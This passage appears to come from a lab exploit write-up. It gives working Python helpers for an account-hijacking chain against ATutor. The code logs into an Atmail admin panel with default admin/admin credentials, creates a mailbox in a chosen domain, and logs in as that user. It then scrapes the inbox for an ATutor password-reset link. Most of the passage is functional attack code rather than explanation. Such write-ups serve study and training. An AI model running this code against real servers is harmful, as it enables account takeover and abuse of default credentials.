# ATmail Server

We use an Atmail server to create a temporary email account in the specified domain to receive the account hijacking email. 

Firstly, we log into the admin account of Atmail and use this to create a user in Atmail. 

```python
def atmail_admin_login(atmail_ip):
    print("Logging in to atmail......")
    USERNAME = 'admin'
    PASSWORD = 'admin'

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    target = f'http://{atmail_ip}/index.php/admin/index/login'
    data = {
        "Username": USERNAME,
        "Password": PASSWORD,
        "send": 1
    }

    r = s.post(target, data=data)

    if re.match('Authentication failed, try again', r.text):
        raise Exception("Atmail admin authentication failed")
    print("Login successful!")
    return s

def create_atmail_user(session, ip, email_prefix, domain):
    print(f"Creating user {email_prefix}@{domain}.....")
    target = f"http://{ip}/index.php/admin/users/create/"
    data = {
        "NewContact": 1,
        "username": email_prefix,
        "domain": domain,
        "Password": "bromine"
    }
    r = session.post(target, data=data)

    if re.findall('Currently using.*of quota', r.text):
        print("User creation successful!")
        return session
    elif re.findall(f'{email_prefix}@{domain} already exists', r.text):
        print("User already exists!")
        return session
    else:
        raise Exception("Atmail fail to create user!")
```

Having created our user, we can then login as the user with the specified password. 

```python
def atmail_user_login(atmail_ip, email_prefix, domain):
    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    s.headers.update(headers)

    proxies = {
        'http': 'http://127.0.0.1:8080'
    }
    s.proxies.update(proxies)

    target = f"http://{atmail_ip}/index.php/mail/auth/processlogin"
    data = {
        "emailName": email_prefix,
        "emailDomain": domain,
        "email": f"{email_prefix}%40{domain}",
        "password": "bromine",
        "MailType": "IMAP",
        "Language": "",
        "emailDomainDefault": "",
        "cssStyle": "original",
        "requestedServer": ""
    }
    r = s.post(target, data = data)

    if re.findall('WebAdmin Control Panel', r.text):
        raise Exception("Login unsuccessful!")
    print("Login successful!")
    return s
```

We then navigate inside the application and mock the Atmail HTTP requests and use regex to find the data we are looking for. 

- We first list all email previews to find the valid ids, and then we search each ID until we find the valid email.

```python
def get_email_code(session, ip):
    headers = {
        'X-Requested-With': 'XMLHttpRequest'
    }

    # Get the list of email IDs from teh folder messages
    target = f"http://{ip}/index.php/mail/mail/listfoldermessages"
    r = session.post(target, headers=headers)
    indexes = re.findall(r'id=\\\"(\d+)\\\"', r.text)
    
    # Read email contents for each email
    for index in indexes:
        target = f"http://{ip}/index.php/mail/viewmessage/index/compact/1/folder/INBOX/uniqueId/{index}/threadChildrenUIDs/false"
        
        r = session.post(target, headers=headers)
        
        # Use regex to find PHP link        
        url_matches = re.findall('(http:\\\/\\\/atutor\\\/ATutor\\\/password_reminder.php.*?)&lt;br', r.text)
        if len(url_matches) == 0: continue
        url = url_matches[0]

        # Escape characters
        url = html.unescape(url)
        url = url.replace('&amp;', '&')
        url = url.replace(r'\/', r'/')
        print(f"Found URL: {url}")
        return url

    raise Exception("No valid password reset URL found!")
```